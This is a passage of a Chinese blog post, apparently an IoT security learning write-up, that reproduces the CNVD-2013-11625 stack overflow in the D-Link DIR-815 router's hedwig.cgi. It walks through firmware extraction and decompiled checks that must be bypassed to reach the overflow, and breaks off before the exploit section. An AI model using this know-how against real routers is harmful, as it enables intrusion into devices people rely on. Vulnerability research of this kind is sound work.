@@ -1,0 +1,883 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    CNVD-2013-11625 |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="DIR-815 栈溢出漏洞复现前言这是我选择复现的第一个iot漏洞,总是对栈溢出有种特别的执念,有种学了一大圈又绕回来的感觉 同时这个固件也是Mips架构的,正好加强一下自己对mips的理解 官方的漏洞报告：DIR-815 | 0 | 准备固件下载地址:下载  (需要挂梯子) binwalk安装：sudo apt install binwalk sasquatch安装：https:&#x2F;&#x2F;github">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CNVD-2013-11625">
+<meta property="og:url" content="https://khighl.github.io.git/2025/06/11/CNVD-2013-11625%20%20DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DIR-815 栈溢出漏洞复现前言这是我选择复现的第一个iot漏洞,总是对栈溢出有种特别的执念,有种学了一大圈又绕回来的感觉 同时这个固件也是Mips架构的,正好加强一下自己对mips的理解 官方的漏洞报告：DIR-815 | 0 | 准备固件下载地址:下载  (需要挂梯子) binwalk安装：sudo apt install binwalk sasquatch安装：https:&#x2F;&#x2F;github">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635346568.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635448835.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635509871.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635636376.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635726634.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635778238.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635924176.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749636021902.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749636080524.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749636154473.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749644522522.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749644987741.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749645678518.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749645798137.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749645923225.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646123372.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646228075.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646600274.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646670357.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646992985.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749647119695.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749647246322.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749647476494.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749650119014.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749650225521.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749650344608.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749651194872.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749651295789.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749655578367.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749655920775.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749656006390.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749656432964.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749656790077.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749657013799.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749657152912.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749716261430.png">
+<meta property="article:published_time" content="2025-06-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-12T08:19:16.294Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="iot漏洞复现">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635346568.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="CNVD-2013-11625">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">CNVD-2013-11625</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DIR-815-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">DIR-815 栈溢出漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%87%86%E5%A4%87"><span class="toc-number">1.2.</span> <span class="toc-text">| 0 | 准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">| 1 | 固件提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">| 2 | 逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.1.</span> <span class="toc-text">条件绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%B7%AF%E5%BE%84%E6%A3%80%E6%9F%A5"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">1.路径检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E6%A3%80%E6%9F%A5"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2.全局变量检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9cgibin-parse-request%E9%80%BB%E8%BE%91%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">对cgibin_parse_request逻辑的分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-POST-content%E5%86%85%E5%AE%B9%E7%9A%84%E6%A3%80%E6%9F%A5"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">3.POST_content内容的检查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="toc-number">1.5.</span> <span class="toc-text">| 3 | 脚本编写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.0.0.1.</span> <span class="toc-text">函数特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%8C%87%E4%BB%A4%E9%9B%86%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.0.0.2.</span> <span class="toc-text">流水线指令集特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mips%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84rop"><span class="toc-number">1.5.0.0.3.</span> <span class="toc-text">mips架构下的rop</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MIPSROP"><span class="toc-number">1.5.0.0.3.1.</span> <span class="toc-text">MIPSROP</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-EXP"><span class="toc-number">1.6.</span> <span class="toc-text">| 4 | EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-usr"><span class="toc-number">1.6.1.</span> <span class="toc-text">qemu-usr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-system"><span class="toc-number">1.6.2.</span> <span class="toc-text">qemu-system</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-CNVD-2013-11625  DIR-815 栈溢出漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-10T16:00:00.000Z" itemprop="datePublished">2025-06-11</time>
+    <time style="display: none;" id="post-update-time">2025-06-12</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="DIR-815-栈溢出漏洞复现"><a href="#DIR-815-栈溢出漏洞复现" class="headerlink" title="DIR-815 栈溢出漏洞复现"></a>DIR-815 栈溢出漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我选择复现的第一个iot漏洞,总是对栈溢出有种特别的执念,有种学了一大圈又绕回来的感觉</p>
+<p>同时这个固件也是Mips架构的,正好加强一下自己对mips的理解</p>
+<p>官方的漏洞报告：<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">DIR-815</a></p>
+<h2 id="0-准备"><a href="#0-准备" class="headerlink" title="| 0 | 准备"></a>| 0 | 准备</h2><p>固件下载地址:<a target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/">下载</a>  (需要挂梯子)</p>
+<p><code>binwalk</code>安装：<code>sudo apt install binwalk</code></p>
+<p><code>sasquatch</code>安装：<code>https://github.com/devttys0/sasquatch</code></p>
+<h2 id="1-固件提取"><a href="#1-固件提取" class="headerlink" title="| 1 | 固件提取"></a>| 1 | 固件提取</h2><p>将下载的bin文件传送到虚拟机中,使用如下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e --preserve-symlinks firmware_name</span><br></pre></td></tr></table></figure>
+
+<p>解包完成后进入文件夹</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635346568.png" alt="1749635346568"></p>
+<p>这个是一个完整的文件系统,</p>
+<p>先找到官方漏洞报告中所说的<code>hedwig.cgi</code>文件，其路径为<code>/htdocs/web/hedwig.cgi</code>，通过<code>find</code>命令看一下：</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635448835.png" alt="1749635448835"></p>
+<p>发现这是一个指向上级目录中elf文件的软链接</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635509871.png" alt="1749635509871"></p>
+<p>我们将这个文件提取出来,顺便将&#x2F;lib&#x2F;中的libc文件也提取出来</p>
+<p>此时便可以使用IDA对elf进行分析</p>
+<h2 id="2-逆向分析"><a href="#2-逆向分析" class="headerlink" title="| 2 | 逆向分析"></a>| 2 | 逆向分析</h2><p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635636376.png" alt="1749635636376"></p>
+<p>可以看到<code>main</code>函数会根据*argv字符串进入不同的解析函数,找到目标<code>hedwigcgi_main</code></p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635726634.png" alt="1749635726634"></p>
+<p>首先可以看到,请求方法必须为<code>POST</code></p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635778238.png" alt="1749635778238"></p>
+<p>然后进入<code>cgibin_parse_request</code>,这个函数会使用一参的函数指针对url进行处理</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749635924176.png" alt="1749635924176"></p>
+<p>会提取出几个环境变量,这几个变量对和栈溢出关系不大,但是不能没有,留着后面再分析</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749636021902.png" alt="1749636021902"></p>
+<p>然后走到<code>sess_get_uid</code>中</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749636080524.png" alt="1749636080524"></p>
+<p>首先对<code>cookie</code>做提取,然后进入一个while(1)循环中</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749636154473.png" alt="1749636154473"></p>
+<p>循环的作用是将cookie以”&#x3D;”为界分割为两段,前一段存贮在v2结构体中,后一段存储在v4结构体中</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749644522522.png" alt="1749644522522"></p>
+<p>然后比较第一部分是不是”uid”,如果是的话将第二部分拼接到a1中(a1为在main函数中通过<code>sobj_new()</code>创建的结构体,初始内容为空)</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749644987741.png" alt="1749644987741"></p>
+<p>返回后,main函数调用了sprintf,没有检查cookie的长度,造成了第一次<code>栈溢出</code>,但是我们接着往下看会发现在两个检测后还有一个sprintf的栈溢出,且在这个过程中strings的内容是没有发生变化的.由于第二次栈溢出时sprintf的拼接方法第一次相差很大,所以我们需要绕过这两个检查,在第二次的溢出点精确控制返回地址.</p>
+<h3 id="条件绕过"><a href="#条件绕过" class="headerlink" title="条件绕过"></a>条件绕过</h3><h4 id="1-路径检查"><a href="#1-路径检查" class="headerlink" title="1.路径检查"></a>1.路径检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v7 = fopen(<span class="string">&quot;/var/tmp/temp.xml&quot;</span>, <span class="string">&quot;w&quot;</span>);         <span class="comment">// first check </span></span><br><span class="line"><span class="keyword">if</span> ( !v7 )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = <span class="string">&quot;unable to open temp file.&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个条件要求在文件系统中存在<code>/var/tmp</code>的路径,在实战(路由器中)肯定是存在这样的路径的,但是在我们的仿真固件中并没有这个路径,所以我们要在<code>/var/</code>路径下创造一个<code>/tmp/</code>的路径</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749645678518.png" alt="1749645678518"></p>
+<h4 id="2-全局变量检查"><a href="#2-全局变量检查" class="headerlink" title="2.全局变量检查"></a>2.全局变量检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !haystack )                              <span class="comment">// second check</span></span><br><span class="line">&#123;</span><br><span class="line">  v1 = <span class="string">&quot;no xml data.&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们双击<code>haystack</code>,去寻找main对它的交叉引用</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749645798137.png" alt="1749645798137"></p>
+<p>其中有四个交叉引用都是对<code>haystack</code>进行<code>lw(加载)</code>操作,只有一处是对它的<code>sw(保存)</code></p>
+<p>说明只有最后一处是对<code>haystack</code>的赋值</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749645923225.png" alt="1749645923225"></p>
+<p>只要这个函数被调用,<code>haystack</code>就会被赋值,所以我们现在开始查找对这个函数的交叉引用</p>
+<p>只发现了一处交叉引用,就是在先前的<code>cgibin_parse_request</code>中</p>
+<p>那么我们就要仔细分析<code>cgibin_parse_request</code>的逻辑了</p>
+<h5 id="对cgibin-parse-request逻辑的分析"><a href="#对cgibin-parse-request逻辑的分析" class="headerlink" title="对cgibin_parse_request逻辑的分析"></a>对<code>cgibin_parse_request</code>逻辑的分析</h5><p>我将此函数的一参命名为<code>function_ptr</code>,现在着重搜索关于这个参数的交叉引用</p>
+<p><img src="/images/CNVD-2013-11625DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1749646123372.png" alt="1749646123372"></p>
+<p>可以发现和<code>function_ptr</code>有关的部分在这个嵌套了<code>if-else</code>和<code>while</code>循环的代码块中</p>
